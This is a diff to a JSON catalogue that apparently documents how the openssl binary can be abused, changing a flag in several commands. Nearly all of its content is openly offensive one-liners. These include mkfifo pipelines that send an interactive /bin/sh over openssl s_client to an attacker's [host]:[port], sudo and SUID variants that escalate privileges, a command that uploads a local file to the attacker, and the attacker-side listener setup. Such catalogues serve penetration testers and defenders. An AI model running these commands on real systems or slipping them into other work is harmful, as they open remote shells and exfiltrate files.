@@ -3,13 +3,13 @@
     "reverse-shell": [
       {
         "description": "To receive the shell run the following on the attacker box:\n\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port [port]\n\nCommunication between attacker and target will be encrypted.",
-        "code": "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -no_ign_eof -connect [host]:[port] > /tmp/s; rm /tmp/s\n"
+        "code": "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect [host]:[port] > /tmp/s; rm /tmp/s\n"
       }
     ],
     "file-upload": [
       {
         "description": "To collect the file run the following on the attacker box:\n\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port [port] > [file]\n\nSend a local file via TCP. Transmission will be encrypted.",
-        "code": "openssl s_client -quiet -no_ign_eof -connect [host]:[port] < [file]\n"
+        "code": "openssl s_client -quiet -connect [host]:[port] < [file]\n"
       }
     ],
     "file-download": [
@@ -34,7 +34,7 @@
     "suid": [
       {
         "description": "To receive the shell run the following on the attacker box:\n\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port [port]\n\nCommunication between attacker and target will be encrypted.",
-        "code": "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -no_ign_eof -connect [host]:[port] > /tmp/s; rm /tmp/s\n"
+        "code": "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect [host]:[port] > /tmp/s; rm /tmp/s\n"
       },
       {
         "code": "echo DATA | openssl enc -out [file]\n"
@@ -43,7 +43,7 @@
     "sudo": [
       {
         "description": "To receive the shell run the following on the attacker box:\n\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port [port]\n\nCommunication between attacker and target will be encrypted.",
-        "code": "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -no_ign_eof -connect [host]:[port] > /tmp/s; rm /tmp/s\n"
+        "code": "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect [host]:[port] > /tmp/s; rm /tmp/s\n"
       }
     ]
   }
